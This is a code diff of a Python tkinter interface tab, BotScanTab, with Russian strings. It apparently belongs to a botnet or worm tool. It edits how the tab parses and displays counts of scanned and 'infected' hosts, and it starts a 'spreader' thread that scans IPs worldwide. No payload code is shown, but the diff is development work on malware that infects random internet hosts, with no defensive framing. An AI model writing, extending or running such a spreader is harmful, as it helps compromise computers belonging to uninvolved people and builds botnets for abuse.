@@ -62,7 +62,7 @@ class BotScanTab(tk.Frame):
             self.current_ip_var.set(f"Текущий IP: {ip}")
         tag = 'info'
         lower = message.lower()
-        if 'заражён' in lower or 'success' in lower or '[+]' in lower:
+        if 'заражён' in lower or 'infected' in lower or 'success' in lower:
             tag = 'success'
         elif 'fail' in lower or 'error' in lower or 'ошибка' in lower:
             tag = 'error'
@@ -96,16 +96,23 @@ class BotScanTab(tk.Frame):
                 if msg.startswith("[IP]"):
                     ip = msg[4:].strip()
                     self.log_to_scan(f"Сканируется {ip}", ip=ip)
-                elif msg.startswith("[Stats]"):
-                    parts = msg.split('|')
-                    scanned_str = parts[0].split(':')[1].strip() if ':' in parts[0] else '0'
-                    infected_str = parts[1].split(':')[1].strip() if len(parts)>1 and ':' in parts[1] else '0'
-                    try:
-                        scanned = int(scanned_str)
-                        infected = int(infected_str)
-                        self.update_stats_display(scanned=scanned, infected=infected)
-                    except:
-                        pass
+                elif msg.startswith("[Stats]") or msg.startswith("[Live]"):
+                    # Парсим числа
+                    parts = msg.split(',')
+                    scanned = None
+                    infected = None
+                    for part in parts:
+                        if 'Просканировано:' in part:
+                            try:
+                                scanned = int(part.split(':')[1].strip())
+                            except:
+                                pass
+                        if 'Заражено:' in part:
+                            try:
+                                infected = int(part.split(':')[1].strip())
+                            except:
+                                pass
+                    self.update_stats_display(scanned=scanned, infected=infected)
                     self.log_to_scan(msg)
                 elif msg.startswith("[Progress]"):
                     try:
@@ -125,7 +132,7 @@ class BotScanTab(tk.Frame):
         self.spreader.interval = 0
         self.progress_var.set(0)
         self.update_stats_display(scanned=0, infected=0)
-        self.log_to_scan("Запущено глобальное сканирование (уникальные IP, весь мир)")
+        self.log_to_scan("Запущено глобальное сканирование")
         threading.Thread(target=self.spreader.start, daemon=True).start()
 
     def scan_range(self):
